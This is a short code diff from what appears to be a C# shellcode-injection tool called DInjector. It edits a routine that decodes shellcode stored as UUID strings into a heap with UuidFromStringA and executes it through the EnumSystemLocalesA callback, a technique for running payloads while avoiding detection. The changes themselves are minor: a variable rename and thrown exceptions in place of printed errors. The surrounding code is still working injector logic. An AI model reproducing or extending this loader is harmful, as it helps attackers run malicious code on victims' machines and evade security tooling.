@@ -13,19 +13,19 @@ namespace DInjector
             if (hHeap != null)
                 Console.WriteLine("(CurrentThreadUuid) [+] HeapCreate");
             else
-                Console.WriteLine("(CurrentThreadUuid) [-] HeapCreate:", hHeap.ToString("x2"));
+                throw new Exception("(CurrentThreadUuid) [-] HeapCreate: " + hHeap.ToString("x2"));
 
             #endregion
 
             #region UuidFromStringA
 
             var uuids = shellcode.Split('|');
-            IntPtr heapAddr = IntPtr.Zero;
+            IntPtr heapAddress = IntPtr.Zero;
 
             for (int i = 0; i < uuids.Length; i++)
             {
-                heapAddr = IntPtr.Add(hHeap, 16 * i);
-                _ = Win32.UuidFromStringA(uuids[i], heapAddr);
+                heapAddress = IntPtr.Add(hHeap, 16 * i);
+                _ = Win32.UuidFromStringA(uuids[i], heapAddress);
             }
 
             Console.WriteLine("(CurrentThreadUuid) [+] UuidFromStringA");
@@ -39,7 +39,7 @@ namespace DInjector
             if (result)
                 Console.WriteLine("(CurrentThreadUuid) [+] EnumSystemLocalesA");
             else
-                Console.WriteLine("(CurrentThreadUuid) [-] EnumSystemLocalesA:");
+                throw new Exception("(CurrentThreadUuid) [-] EnumSystemLocalesA");
 
             #endregion
         }
